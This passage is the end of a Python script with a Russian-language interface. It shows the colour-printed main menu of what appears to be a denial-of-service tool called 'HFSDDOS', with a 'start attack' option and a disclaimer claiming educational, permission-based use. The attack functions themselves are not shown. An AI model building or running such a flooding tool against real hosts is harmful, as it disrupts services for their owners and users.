Канал: {colorama.Fore.BLUE}@hfsads{colorama.Fore.RESET}
Версия: 1.1
Дата релиза: Март 2025

Цель: Образовательное использование и тестирование с разрешения владельца системы.
    """)
    input("Нажмите Enter...")

def main_menu() -> None:
    """Основное меню"""
    while True:
        os.system("clear")
        print(Fore.GREEN + Style.BRIGHT + "        === HFSDDOS ===")
        print("        Created by" + Fore.BLUE + " @hfsads")
        print(Fore.RESET + """
        1. Начать атаку
        2. Информация о хосте
        3. База знаний
        4. О нас
        5. Выход
        """)
        choice = input("Выберите действие (1-5): ")
        if choice == "1":
            start_attack()
        elif choice == "2":
            host_info()
        elif choice == "3":
            show_knowledge_base()
        elif choice == "4":
            show_about()
        elif choice == "5":
            logger.info("Выход...")
            break
        else:
            logger.error("Неверный выбор!")
            input("Нажмите Enter...")

if __name__ == "__main__":
    try:
        main_menu()
    except Exception as e:
        logger.critical(f"Критическая ошибка: {e}")